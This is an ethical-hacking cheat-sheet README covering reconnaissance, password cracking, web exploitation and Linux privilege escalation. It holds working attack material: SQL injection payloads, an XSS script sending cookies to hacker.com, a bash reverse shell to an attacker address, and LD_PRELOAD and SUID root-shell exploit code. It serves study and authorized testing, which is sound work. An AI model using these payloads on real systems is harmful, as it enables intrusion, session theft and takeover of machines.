# Ethical Hacking Tool Repository

This repository provides a curated collection of tools used for various **Ethical Hacking** and **Penetration Testing** activities. Each major discipline of ethical hacking is organized into a dedicated section, including a selection of commonly used tools and practical examples demonstrating their usage.

The repository is intended to serve as a concise and practical *reference guide* (cheat sheet) that can be readily consulted during penetration testing engagements, security assessments, Capture The Flag (CTF) competitions, and other authorized offensive security activities.

This repository covers the following areas:

- [Fingerprinting](#fingerpriting)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)

## Fingerprinting

Fingerprinting refers to the systematic process of collecting information about a target system through direct or indirect interaction during an ethical hacking or penetration testing engagement. It includes both **passive** and **active reconnaissance** techniques and aims to identify technical and contextual characteristics of the target. These characteristics may include the operating system, network architecture, open ports, exposed services, software versions, and application behavior.

**Passive fingerprinting** consists of gathering information without directly interacting with the target system. This approach typically involves the analysis of publicly available data sources, metadata, DNS records, or network traffic that is already being transmitted. Passive techniques are considered stealthy, as they do not generate additional traffic or detectable activity on the target infrastructure.

**Active fingerprinting**, by contrast, requires direct interaction with the target system. Controlled probes and requests are sent in order to trigger responses that disclose further technical details. While active techniques generally provide more precise and comprehensive information, they may generate logs or alerts. For this reason, such techniques must only be conducted with explicit authorization.

This section covers the following categories of fingerprinting techniques:

- [Web Browser Analysis](#web-browser-analysis)
- [Scanning](#scanning)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Enumeration](#enumeration)

### Web Browser Analysis

Although it may not be immediately apparent, modern web browsers provide a wide range of built-in tools that can be leveraged to analyze a website and, by extension, the service hosting it.

All major web browsers include **Developer Tools**, commonly accessible through the *Inspect* option. These tools enable the examination of HTML, CSS, and JavaScript source code, the inspection of network requests, the analysis of session cookies and local storage, and interaction with a JavaScript console capable of executing arbitrary client-side code. In principle, these features are designed to expose only resources that the user is already authorized to access locally. For example, JavaScript code is executed on the client side, and cookies are restricted to the user’s own session data. As a result, Developer Tools are not inherently intended to compromise application security.

From an ethical hacking perspective, however, the information exposed through Developer Tools can be highly valuable. The analysis of client-side logic, cookie structures, request parameters, and input handling mechanisms may provide insight into the internal behavior of the application. Such information can reveal weaknesses in areas such as session management, input validation, or access control, potentially enabling the identification of functionality that can be misused beyond its intended scope.

Typical analysis activities performed using Developer Tools include:

- Reviewing JavaScript files to identify hidden functionality or client-side validation logic  
- Inspecting HTTP requests and responses to observe parameters, headers, and authentication tokens  
- Examining cookies and local storage entries to understand session handling mechanisms  
- Observing API endpoints accessed by the application during normal user interaction  

In addition to built-in Developer Tools, various browser extensions can further assist in web application fingerprinting by revealing underlying technologies or altering request behavior. Commonly used extensions include:

- **FoxyProxy** – Enables rapid switching between proxy configurations, facilitating the interception and analysis of HTTP and HTTPS traffic through external tools.  
- **User-Agent Switcher and Manager** – Allows modification of the User-Agent header to simulate access from different browsers, operating systems, or devices.  
- **Wappalyzer** – Detects and reports technologies used by a website, including web frameworks, content management systems, server software, and analytics platforms.

### Scanning

Scanning is the process of systematically identifying active components within a target environment, such as live hosts, reachable network paths, open ports, and exposed services. This phase provides a clearer technical view of the target system and helps define the potential attack surface prior to exploitation.

Several common scanning techniques include:
- [Ping Sweep](#ping-sweep)
- [ARP Sweep](#arp-sweep)
- [Traceroute](#traceroute)
- [DNS Enumeration](#dns-enumeration)
- [War Driving](#war-driving)
- [Port Scanning](#port-scanning)

#### Ping Sweep

A ping sweep is a technique used to determine which hosts within a given IP address range are active. It works by sending ICMP Echo Request packets to multiple addresses and analyzing the responses. Hosts that reply are considered reachable, allowing the tester to identify live systems on a network. While simple and fast, ping sweeps may be unreliable in environments where ICMP traffic is filtered or blocked.

The following tools can be used to perform ping sweep operations:

- `ping` : The `ping` utility is a basic network diagnostic tool used to test the reachability of a single host by sending ICMP Echo Requests and measuring response times. While not designed for large-scale sweeps, it is useful for validating connectivity to individual systems.

```bash
# Ping a machine indefinitely until manually stopped
ping 8.8.8.8

# Send 10 ICMP Echo Requests (Linux / macOS)
ping -c 10 example.com

# Send 10 ICMP Echo Requests (Windows)
ping -n 10 10.0.0.1

# Send ICMP packets with a payload size of 32 bytes (40 bytes including header)
ping -s 32 8.8.8.8
```

- `fping` : The `fping` tool is an enhanced version of `ping` optimized for scanning multiple hosts in parallel. It is particularly effective for performing fast ping sweeps across IP ranges or host lists.

```bash
# General command usage
fping <options> {MACHINE_IP | HOSTNAME}

# Commonly used attributes
-a                 # Display only hosts that are alive
-u                 # Display only unreachable hosts
-c <count>         # Number of echo requests to send per host
-t <timeout>       # Timeout in milliseconds to wait for a reply
-r <retries>       # Number of retries before marking a host unreachable
-s                 # Display summary statistics
-e                 # Show elapsed time for each response
-f <file>          # Read target hosts from a file
-g 192.168.1.0/24  # Generate and scan a target IP range
-I <interface>     # Specify the network interface to use
-S <src>           # Set a custom source IP address
-q                 # Suppress per-host output (useful for scripting)
-N                 # Disable DNS resolution
```

- `nmap` : Although primarily known for port scanning, `nmap` can also be used for host discovery by performing ping sweeps using its no port scan mode. This method leverages multiple discovery probes, making it more flexible than traditional ICMP-only approaches.

```bash
# Ping sweep against a single target
nmap -sn 192.168.1.134

# Ping sweep over an IP range
nmap -sn 192.168.1.10-50

# Ping sweep using CIDR notation
nmap -sn 192.168.1.0/24

# Ping sweep against a list of specific IP addresses
nmap -sn 192.168.1.1 192.168.1.3 192.168.1.4
```

#### ARP Sweep

An ARP sweep is a host discovery technique used primarily within local area networks (LANs). It operates by sending Address Resolution Protocol (ARP) requests to determine which IP addresses are actively associated with MAC addresses on the local network. Because ARP traffic is required for normal network operation and is typically not filtered within the same broadcast domain, ARP sweeps are generally more reliable than ICMP-based methods for identifying live hosts on a LAN.

- `arp-scan`: The `arp-scan` is a command-line network scanning tool specifically designed to perform ARP-based host discovery. It sends ARP request packets to target IP addresses and analyzes the replies to identify active devices, their IP addresses, and corresponding MAC addresses. Due to its reliance on Layer 2 communication, `arp-scan` is effective only within the local network segment and cannot be used to scan remote networks beyond the broadcast domain.

```bash
# Scan the local network associated with the active interface
arp-scan --localnet

# Scan a specific subnet
arp-scan 192.168.0.0/24

# Perform an ARP sweep using a specified network interface
arp-scan --interface=eth0 192.168.0.0/24

# Scan a defined IP address range
arp-scan 10.0.0.1-10.0.0.50
```

#### Traceroute

Traceroute is a network diagnostic technique used to determine the path that packets take from a source system to a target host. By analyzing the sequence of intermediate routers (hops) and their response times, traceroute helps map network topology, identify routing issues, potential choke points, firewalls, or filtering devices. It is a valuable tool for understanding network structure, troubleshooting connectivity, and assessing defensive boundaries.

- `traceroute` (Linux / macOS): The `traceroute` command sends packets with incrementally increasing Time-To-Live (TTL) values to elicit responses from each hop along the route to the destination. Each hop responds with its IP address and round-trip time, allowing mapping of the path.

```bash
# Trace the route to a target host by hostname
traceroute example.com

# Trace the route to a target host by IP address
traceroute 8.8.8.8

# Limit the maximum number of hops
traceroute -m 20 example.com

# Change the number of probe packets per hop
traceroute -q 5 example.com

# Use ICMP ECHO instead of UDP probes
sudo traceroute -I example.com

# Resolve all addresses to numeric IPs only (disable DNS lookup)
traceroute -n example.com

# Force traceroute to use only IPv4 addresses
traceroute -4 8.8.8.8
```

- `tracert` (Windows): The Windows equivalent of traceroute, `tracert`, works similarly by sending ICMP Echo Request packets with increasing TTL values. Each responding router along the path provides its address and response time.

```bash
# Trace the route to a target host by hostname
tracert example.com

# Trace the route to a target host by IP address
tracert 8.8.8.8

# Limit the maximum number of hops
tracert -h 20 example.com

# Set the timeout for each reply in milliseconds
tracert -w 200 example.com

# Do not resolve IP addresses to hostnames
tracert -d example.com

# Force tracert to use only IPv4 addresses
tracert -4 -h 15 example.com
```

#### DNS Enumeration

DNS enumeration is the process of collecting information from the Domain Name System in order to identify hostnames, subdomains, IP addresses, and DNS records associated with a target domain. By querying DNS servers and analyzing their responses, additional infrastructure can be uncovered, including mail servers, development systems, staging environments, or internal naming conventions. This information is essential for expanding the attack surface during reconnaissance.

- `dig`: The `dig` (Domain Information Groper) command is a flexible DNS query tool used to retrieve specific DNS records directly from name servers. It provides detailed, low-level output and is commonly used for manual DNS analysis and troubleshooting.

```bash
# Query A records for a domain
dig example.com A

# Query MX (mail server) records
dig example.com MX

# Query name server records
dig example.com NS

# Query TXT records
dig example.com TXT

# Perform a reverse DNS lookup
dig -x 8.8.8.8

# Attempt a DNS zone transfer from a specific name server
dig @ns1.example.com example.com AXFR
```

- `nslookup`: This command is an interactive DNS query tool available on most operating systems. It is commonly used for basic DNS resolution and quick record lookups.

```bash
# Resolve a domain to its IP address
nslookup example.com

# Query MX records
nslookup -type=MX example.com

# Query name server records
nslookup -type=NS example.com

# Perform a reverse DNS lookup
nslookup 8.8.8.8

# Query a specific DNS server
nslookup example.com 8.8.8.8
```

- `dnsenum`: is an automated DNS enumeration tool designed to discover subdomains, hostnames, and DNS records using brute-force techniques and zone transfer attempts.

```bash
# Perform basic DNS enumeration
dnsenum example.com

# Use a custom wordlist for subdomain brute-forcing
dnsenum example.com -f subdomains.txt

# Enumerate with Google scraping disabled
dnsenum example.com --noreverse

# Specify a DNS server to query
dnsenum example.com --dnsserver 8.8.8.8
```

- `host`: The `host` command is a simple DNS lookup utility used to resolve domain names, perform reverse lookups, and retrieve specific DNS records.

```
# Resolve a domain name to an IP address
host example.com

# Query MX records
host -t MX example.com

# Query name server records
host -t NS example.com

# Perform a reverse DNS lookup
host 8.8.8.8

# Resolve a specific subdomain
host vpn.example.com
```

#### War Driving

War driving is a reconnaissance technique focused on identifying and analyzing wireless networks within a physical area. It involves scanning for Wi‑Fi access points while moving through an environment and collecting information such as network names (SSIDs), BSSIDs, encryption types, channels, and signal strength. This technique is commonly used to assess the security posture, coverage, and exposure of wireless infrastructures.

- `airodump-ng`: is a wireless packet capture and monitoring tool that is part of the Aircrack‑ng suite. It passively captures IEEE 802.11 frames to identify nearby access points and connected clients, making it particularly useful for wireless reconnaissance and data collection during war driving activities.

```bash
# Start monitoring all nearby wireless networks
airodump-ng wlan0mon

# Monitor networks on a specific channel
airodump-ng --channel 6 wlan0mon

# Write captured packets to files for later analysis
airodump-ng --write wardrive_capture wlan0mon

# Monitor a specific access point by BSSID
airodump-ng --bssid 00:11:22:33:44:55 wlan0mon

# Monitor a specific access point and channel while saving packets
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write ap_capture wlan0mon
```

- `wifite`: is an automated wireless auditing tool designed to simplify the discovery and assessment of wireless networks. It integrates multiple tools to scan for nearby access points, identify encryption types, and perform automated attacks where authorized, making it useful for rapid assessment during wireless reconnaissance.

```bash
# Scan for nearby wireless networks
wifite

# Scan only WPA/WPA2 protected networks
wifite --wpa

# Scan only WEP protected networks
wifite --wep

# Use a specific wireless interface
wifite -i wlan0mon

# Enable verbose output for detailed analysis
wifite --verbose
```

#### Port Scanning

Port scanning is the process of probing a target system to identify open, closed, or filtered network ports. Each open port may correspond to an exposed service or application and represents a potential entry point for further analysis. Port scanning is a critical step in reconnaissance, as it provides essential information for service enumeration, version detection, and vulnerability assessment.

- `nmap`  
  `nmap` (Network Mapper) is a widely used network scanning tool designed to discover open ports, identify services, detect operating systems, and perform advanced scanning techniques. It supports multiple scan types and extensive customization, allowing detailed analysis of a target’s exposed network surface.

```bash
# Scan the default top 1000 TCP ports
nmap 192.168.1.10

# Scan a specific set of ports
nmap -p 22,80,443 192.168.1.10

# Scan a port range
nmap -p 1-1024 192.168.1.10

# Scan all 65535 TCP ports
nmap -p- 192.168.1.10

# Scan both TCP and UDP ports
nmap -sS -sU -p 53,67,68,123 192.168.1.10
```

```bash
# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.10

# TCP connect scan
nmap -sT 192.168.1.10

# UDP scan
nmap -sU 192.168.1.10

# TCP ACK scan (firewall rule detection)
nmap -sA 192.168.1.10

# TCP FIN scan
nmap -sF 192.168.1.10

# TCP NULL scan
nmap -sN 192.168.1.10

# TCP XMAS scan
nmap -sX 192.168.1.10
```

```bash
# Detect service versions
nmap -sV 192.168.1.10

# Enable default NSE scripts
nmap -sC 192.168.1.10

# Run specific NSE scripts
nmap --script=http-enum 192.168.1.10

# Combine service detection and scripts
nmap -sV -sC 192.168.1.10
```

```bash
# Perform an idle (zombie) scan using a third-party host
nmap -sI 192.168.1.20 192.168.1.10
```

### Vulnerability Analysis

After identifying potential entry points and collecting technical information during the scanning phase, the next step is to analyze possible vulnerabilities that may be exploited within the discovered attack surface. Vulnerability analysis focuses on identifying known weaknesses in systems, services, and applications in order to assess risk and guide further exploitation or mitigation efforts.

#### Standard Frameworks

In cybersecurity, standardized frameworks exist to catalog and describe known vulnerabilities and weaknesses. These frameworks provide a common language and reference model for identifying, classifying, and researching security issues based on observed system characteristics.

The most widely used frameworks include:

- **Common Weakness Enumeration (CWE)**  
  CWE is a comprehensive list of software and hardware weakness types. It focuses on underlying design and implementation flaws that may lead to vulnerabilities and is useful for understanding root causes and attack patterns.  
  Reference: https://cwe.mitre.org/

- **Common Vulnerabilities and Exposures (CVE)**  
  CVE is a publicly available catalog of specific, real-world vulnerabilities. Each CVE entry describes a known vulnerability in a product or system and is commonly referenced by security tools, advisories, and patches.  
  Reference: https://www.cve.org/

These frameworks enable security professionals to map discovered services and software versions to known weaknesses and documented exploits.

#### Nessus

Nessus is a widely used vulnerability assessment tool that provides a graphical user interface for scanning hosts and identifying known vulnerabilities. It performs automated checks against systems and services and correlates findings with CVE and CWE databases to produce detailed vulnerability reports.

Nessus Essentials is a free version suitable for learning and small-scale assessments.

Reference: https://www.tenable.com/products/nessus/nessus-essentials

Once installed and running, the Nessus web interface can typically be accessed locally at:

https://localhost:8043

Through the interface, scan policies can be configured, targets defined, and results reviewed in a structured and prioritized manner.

#### OpenVAS

OpenVAS (Open Vulnerability Assessment System) is an open-source vulnerability scanning framework that performs automated security assessments. It identifies vulnerabilities by scanning target systems and correlating findings with known vulnerability databases.

One common method to deploy OpenVAS is through a Docker container, which simplifies setup and configuration.

```bash
# Install Docker
sudo apt install docker.io

# Pull and run the OpenVAS Docker container
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```

After the container is running, the OpenVAS web interface can be accessed via a web browser:

https://127.0.0.1

Default credentials (for initial access):

- Username: `admin`
- Password: `admin`  

Once authenticated, scan tasks can be created to assess target hosts, and findings are automatically linked to known vulnerabilities for further analysis and remediation planning.

### Enumeration

Enumeration is the phase that follows scanning and vulnerability analysis. At this stage, the objective is to collect as much detailed and precise information as possible about the target systems based on the previously identified structure and attack surface.

This process includes identifying running services and their versions, operating system details, supported protocols, user accounts, network shares, and service-specific configurations. Enumeration refines earlier findings and helps accurately confirm real and exploitable vulnerabilities, reducing false assumptions and improving attack precision.

- `telnet`: is a network protocol that establishes a raw TCP connection to a specified host and port, allowing direct interaction with the service. Upon connection, normally, most services will output a banner with information on the running services.

```bash
# Connect to a remote service using Telnet
telnet 192.168.1.10 80

# Manually send an HTTP request to retrieve server headers
GET / HTTP/1.1
Host: example.com

# Useful commonly used ports
25 -> SMTP
21 -> FTP
110 -> POP3
143 -> IMAP
22 -> SSH
443 -> HTTPS
53 -> DNS
80 -> HTTP
```

- `nc`: Netcat provides low-level access to network connections and is widely used for enumeration and testing service behavior. It is capable of acting as both a client and a server using TCP or UDP.

```bash
# Connect to a remote TCP service
nc 192.168.1.10 80

# Start a TCP listener on port 1234
nc -l -p 1234

# Start a persistent listener that remains active after disconnects
nc -l -p 1234 -k

# Enable verbose output
nc -v 192.168.1.10 21

# Enable very verbose output
nc -vv 192.168.1.10 21

# Disable DNS resolution and use numeric IP addresses only
nc -n 192.168.1.10 22
```

- `nbtscan`: is a NetBIOS enumeration tool used in Windows-based networks. It queries NetBIOS Name Service (NBNS) to retrieve information about hosts, including computer names, IP addresses, workgroups or domains, and logged-in users. It is particularly useful when SMB-related ports are exposed.

```bash
# Scan a subnet for NetBIOS information
nbtscan 192.168.1.0/24

# Perform a verbose scan
nbtscan -v 192.168.1.0/24
```

- `enum4linux`: is an automated enumeration tool for Windows and Samba systems. It leverages SMB and RPC services to gather detailed information such as user accounts, groups, shared resources, password policies, and domain information.

```bash
# Perform basic SMB enumeration
enum4linux 192.168.1.20

# Perform full enumeration
enum4linux -a 192.168.1.20

# Enumerate users only
enum4linux -U 192.168.1.20

# Enumerate shares
enum4linux -S 192.168.1.20
```

- `name_snoop`: is a DNS enumeration tool designed to discover valid hostnames by analyzing DNS responses. It can reveal internal naming patterns and additional subdomains.

```bash
# Enumerate hostnames for a domain
name_snoop example.com
```

- `smtp_user_enum`: is used to identify valid email users on SMTP servers by issuing mail-related commands and observing server responses.

```bash
# Enumerate users using the VRFY command
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.30

# Enumerate users using the RCPT command
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.30
```

- `snmp-check`: is an SNMP enumeration tool that extracts detailed information from SNMP-enabled devices when a valid community string is known or guessed.

```bash
# Enumerate SNMP information using the default community string
snmp-check 192.168.1.40

# Specify a community string
snmp-check -c public 192.168.1.40
```

- `nmap`: includes NSE scripts specifically designed for SNMP enumeration, allowing structured data extraction from network devices.

```bash
# Enumerate SNMP system information
nmap -sU -p 161 --script=snmp-info 192.168.1.40

# Enumerate SNMP interfaces and routing information
nmap -sU -p 161 --script=snmp-interfaces,snmp-netstat 192.168.1.40
```

## Exploitation

Once we have all the information we could gather about a system, the next phase consists in trying to exploit said system.

There are a lot of entry points and exploits that we can use, and the best choices will depend on the information we found. Normally we want to try and start to exploit the attack vector that seems more vunerable and potentially will detect less our activities.

There are several exploit disciplines such as:
- [Intrusion](#intrusion)
- [Client Side Exploitation](#client-side-exploitation)
- [AntiVirus Evasion](#antivirus-evasion)
- [Password Attacks](#password-attacks)
- [Web Exploitation](#web-exploitation)
- [Privilege Escalation](#privilege-escalation)

Customized Wordlist
Cewl
```
# Get words from a website crawling
cewl -w {DESTINATION PATH} -d {DEPTH OF SEARCH} -m {MINIMUM WORD LENGTHS} {WEBSITE TO CRAWL}
```

Crunch
```
# Generate a wordlist based on all possible character combinations
crunch <min> <max> <char list> -o <destination>

# <char list> example
abdc232
214snfs
2rmfdsn

-t option

@ - all lowercase chars
, - all uppercase chars
% - all numeric
^ - special chars

examples: pass%%, name@,%...
```

Generate wordlist based on user information
```
git clone https://github.com/Mebus/cupp.git

# Run
python3 cupp.py -i

# Help
python3 cupp.py -h
```

Generate usernames based on user information
```
git clone https://github.com/therodri2/username_generator.git

# Get all the options for username_generator
python3 username_generator.py -h
```

Hashcat
```
# Default dictionary attack command
hashcat -a 0 -m {HASH MODE} {HASH} {WORDLIST IF APPLIABLE}

# Brute-force attack command
# List possibilities
hashcat -a 3 ?d?d?d?d --stdout

# Attack command
hashcat -a 3 -m {HASH MODE} {HASH} ?d?d?d?d
-a 7 -> wordlist + mask

# Show if positive result
hashcat -a {ATTACK MODE} -m {HASH MODE} {HASH} {WORDLIST IF APPLIABLE} --show

# Get information on hash types etc...
hashcat -h
```

John the Ripper
```
# Default command execution
john <options> {HASH FILE PATH}

# Specify wordlist
john --wordlist={PATH TO WORD LIST} {HASH}

# Specify format
john --format={HASH FORMAT} --wordlist={WORD} {HASH}

# List all available formats
john --list=formats

# Brute-force attack command
john --mask={THE MASK} --format={FORMAT} {HASH}

# Show (if) cracked password
john --format={FORMAT} --show {HASH}

# Single crack mode (base yourself on user information)
john --single --format={FORMAT} {HASH WITH USER INFO}

# Calling a custom rule in single crack mode
john --single --rule={RULE NAME} --format={FORMAT} {HASH WITH USER INFO}

# Calling a custom rule in normal mode (applies to the words in the list)
john --wordlist={WORDLIST} --rule={RULE NAME} --format={FORMAT} {HASH}

# Print all the brute force words
--stdout
```

```
# HASH WITH USER INFO (COULD BE THE UNSHADOW FILE)
{username}:{hash}
```

```
# Defining John Rules for password guessing
Az - a single word coming from wordlist, etc...
"..." - Add at the end of word
^... - Add at beggining

Use regex notation
```

```
# Unshadow suite
unshadow {PATH TO PASSWD} {PATH TO SHADOW} > {UNSHADOW PATH}

# Zip suite
zip2john {ZIP FILE} > {HASH DESTINATION FILE}

# Rar suite
rar2john {RAR FILE} > {HASH DESTINATION FILE}

# SSH suite
ssh2john {PRIVATE KEY FILE} > {HASH DESTINATION FILE}
```

```
# Get hash id
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

# Run hash id
python3 hash-id.py
```

Hydra for online attacks
```
# FTP Attack
hydra {HOST} -l <username> -P <wordlist>

# SMTP
hydra {HOST} -l <email address> -P <wordlist>

# SSH
hydra {HOST} -L <userlist> -P <wordlist>

# HTTP LOGIN
hydra {HOST} {REQUEST-TYPE} -l {USER} -P {WORDLIST} "{content}"

{REQUEST-TYPE} - http_get_form or http_post_form
{content} - path:parameters:condition

examples
path: /login-get/index.php
parameters: username=^USER^&password=^PASS^
condition: S:logout.php -> Success condition
           F: Invalid Login! -> Fail condition

-L -> several users
-l -> one user
-p -> one password
-P -> several passwords
-f -> stop bruteforce after finding correct
-v -> Verbose
```

Password spraying

Antivirus

ClamAV: https://www.clamav.net/
VirusTotal: https://www.virustotal.com/gui/home/upload
Jotti VirusScan: https://virusscan.jotti.org/ (Does not share with AV companies)

Signature based open source Antivirus

```
clamscan path/to/scan -> scan a folder
sigtool --{hash algorithm} path/to/file -> generate the hash signature of a file
clamscan -d path/to/custom/signaturedatabase path/to/scan

yara database -> a file with rules in yara formats, a file is considered malware if it matches the rules in the database
database -> a file with signatures separated by \n
--debug -> show more information
```

Fingerpriting Antivirus and other services

SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker

Analyze the contents of a file

HxD application -> https://mh-nexus.de/en/hxd/

PE-Bear: (Analyze windows PE strucuture)
```
strings path/to/file -> outputs all human readable strings
```

Compile assembly code

```
write assembly code
nasm -f <system type (32 or 64)> path/to/code -> o
ld path/to/o -o future/exec -> exec
objdump -d file/to/dump -> shellcode (binary)
objcopy -j .text -O binary <exec> <exec>.text -> text file
xxd -i <exec>.txt -> binary in C code
xxd -i <bin>.bin -> binary in C code

in c:

(*(void(*)())message)();
```

Evasion of AV

Encoding & Decryption

Packers

ConfuserEx

Binders -> Merge two programs

### Web Exploitation

#### SQL Injection

```sql
-- Normal database fetching query
SELECT u_name, u_age, u_email FROM users WHERE u_id='$Id';

-- Normal database login query
SELECT * FROM users WHERE u_email='$Email' AND u_password='$Password';
```

```
# Union payload to obtain unauthorized information

$Id=1' UNION SELECT u_name, u_password, u_address FROM users; -- 

{example_condition}' UNION SELECT {same number of custom rows} FROM {custom table}; -- 

# Login payload to obtain unauthorized session

$Email=admin@email.com'; -- 

{desired account}'; -- 
```

```
# Boolean payload for confirmation results
$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 -- 

# Time delay payload for confirmation results
$Id=10' AND IF(version() like ‘5%’, sleep(10),
‘false’) -- 

# Error based payload for error display results
$Id=10' OR UTL_INADDR.GET_HOST_NAME( (SELECT
user FROM DUAL) ) -- 

# Out of band payload for error display results
$Id=10' OR UTL_HTTP.request(‘testerserver.com:80' || (SELECT user FROM DUAL)) -- 
```

SQLMap

#### Session Hijacking

```python
import requests

url = "https://example.com"

# Define your custom cookies as a dictionary
cookies = {
    "sessionid": "123456",
    "user": "alice"
}

response = requests.get(url, cookies=cookies)
```

```bash
curl -b "sessionid=123456; user=alice" https://example.com

curl -b cookies.txt https://example.com
```

#### Cross Site Request Forgery

Consits of prompting a user to visit a website they may be logged into and executing a command they are not aware of, for example:

```
http://bank.com/transfer?amount=6000&to=hacker
```

If user is logged in `bank.com` and clicks this link, if no proper verification is done, he will transfer money to the attacker.

The main problem is getting the user to click this link, which could be performed, for example:

```html
<!-- User visits malicious website -->

<!-- User loads the following HTML -->
<img src=http://bank.com/transfer?amount=6000&to=hacker>

<!-- User visits website unwillingly and performs transaction -->
```

#### Cross Site Scripting

Executing malicious java scripts by users without their intention. Stored and reflected. Exploit on form inputs that get printed on webpages.


```js
// Script example to steal session cookies
<script>
window.open("http://hacker.com/steal?c=" + document.cookie)
</script>
```

XSSer

### Privilege Escalation

Having access to a system doesn't always mean that we are able to do anything we want. Most of the times, when gaining access to a system we will probably be limited to a normal user with limited privileges, only allowing us to do little to no abuse.

Enters privilege escalation. The objective of this discipline is, once having access to a system, no matter what user we start in we exploit it to escalate our permissions to a more privileged user, or the admin itself if possible.

By exploiting and escalating our privileges, we will be able to abuse the system better and obtain explore it more.

The first step of this exploitation is exploring it's abuse vectors, covered by enumarition.

#### Enumeration

Consists of examaning the system with all available options we have as the user we currently have access to.

<ins>Linux</ins>

List of useful Linux commands:

```shell
# Get name of the machine
hostname

uname -a -> Information on the running system
/proc/version -> Kernel information
ps -> Process information
ps -A -> All processes
ps axjf -> Process tree
/etc/issue -> System information
env -> Enviromental variables
sudo -l -> List of commands current user can run as sudo
ls -la -> List all files even hidden
id <user> -> Information on users
/etc/passwd -> Information on users
history -> List of recent commands
ifconfig -> Network interface info
ip route -> Network routes
netstat -> Network communication info
netstat -a (open ports)
netstat -at (tcp) | -au (udp)
netstat -l (listening)
netstat -s (statistics)
netstat -tp (service info)
find -> filter directories and find depending on args
grep -> filter input

# Files with SUID or SGID set
find / -type f -perm -04000 -ls 2>/dev/null

# Files with capabilities
getcap -r / 2>/dev/null

# See cron jobs schedule
/etc/crontab

# See writable folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# See NFS configuration
cat /etc/exports
showmount -e {VICTIM_ADDRESS}

# See permitted sudo commands for user
sudo -l

# History of commands on user
cat /home/{user}/.bash_history
```

List of useful third-party tools:

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

Enumeration once accessed

Tools

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

<ins>Windows</ins>


#### Kernel Exploits

One of the ways of escalating privileges is abusing the kernel version currently in use in the attack machine. This kernel version might have already written exploits that help us escalate privileges.

To looks for these exploits we can use:

- exploitDb
- searchsploit

#### Sudo Exploits

Even though using sudo is pretty limited, sometimes some low lever users have access to a set of restricted privileged commands using sudo.

Some of these applications might unwillingly allow us to do things we are not supposed to.

For example, Apache2:

```
apache2 -f /etc/shadow -> will show us the first line of etc/shadow after failing.
```

Patrical examples:

```
# Using find
sudo find \ -type f -name "sh" -exec {} \;

# Using nmap
sudo nmap --interactive
```

LD_PRELOAD

If a user has this permission `env_keep+=LD_PRELOAD`, this allows for custom libraries to be loaded before the sudo privileged program is executed using the LD_PRELOAD option.

Here is an exploit in c using this:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
# Compile as a library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute the exploit
sudo LD_PRELOAD=/home/user/ldpreload/shell.so <privilege cmd>
```

#### SUID Exploits

Sometimes in some systems, there are files with SUID owned by root. These files allow their execution with root privileges by any user. If a vulnerable file is SUID, it could be used to exploit an escalate our privileges allowing us to do whatever we want.

Examples are files that allow us to run arbitary code, or that allow us to manipulate restricted files.

Binaries known to be exploitable: https://gtfobins.github.io/

#### Capabilities Exploits

Just like SUID, capabilities allow users to get certain privileged permissions when executing commands. Unlike SUID, these permissions are more fine-grained and related to specific actions rather than the general executing a program as root.

If not properly set they could still be exploited to read unauthorized files or even gain root privileges.

Binaries known to be exploitable with capabilites also: https://gtfobins.github.io/

#### Cron Jobs Exploits

Cron jobs are scripts that are scheduled in a system to run from time to time. They normally run associated to the user who created them which means there will be scripts probably ran by root.

If the ran scripts are not properly permission protected or are not defined by a full path, they could be edited to run arbitary code, or the PATH variable could be changed to redirect the script to a PATH where the user has write permission. (MORE ON PATH IN THE NEXT SECTION).

Here is a reverse shell script that could be used for cron jobs:

```shell
#!/bin/bash

bash -i >& /dev/tcp/{attacker-address}/{port} 0>&1
```

```
# Attacker machine
nc -nlvp {port}
```

#### PATH Exploits

If a command is called without its full path specification, linux will look for it under the folders in the $PATH enviroment variable.

If a SUID program calls for a "test" program without specification of the full path, we could manipulate the $PATH variable to look first in a malicious directory for `test` cmd.

In this directory we would have a `test` script that would run a shell.

Here is how we would do:

```
# Add a directory to priority in PATH
export PATH=/tmp:$PATH

# Create malicious script
echo "/bin/bash" > test (in tmp directory)
```

### NFS Exploits

Sometimes gaining privilege escalation is not only about the local machine. We could for example find a SSH private key for root user and just SSH as the root user.

NFS (Network File Sharing) allows for files to be shared across devices. If the target is misconfigured (no_root_squash), which will make files be created by the owner of the directory (root if the case), NFS could allow for files to be written in this folders with root privileges and SUID, allowing for privilege escalation.

```
# Mount NFS on attacker
mount -o rw {address}:{path} {path/in/attacker}
```

Build privilege escalation exploit
```
int main() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
    return 0;
}
```

Compile it and give it SUID
```
# In the mounted folder
gcc exploit.c -o exploit -w

chmod +s exploit
```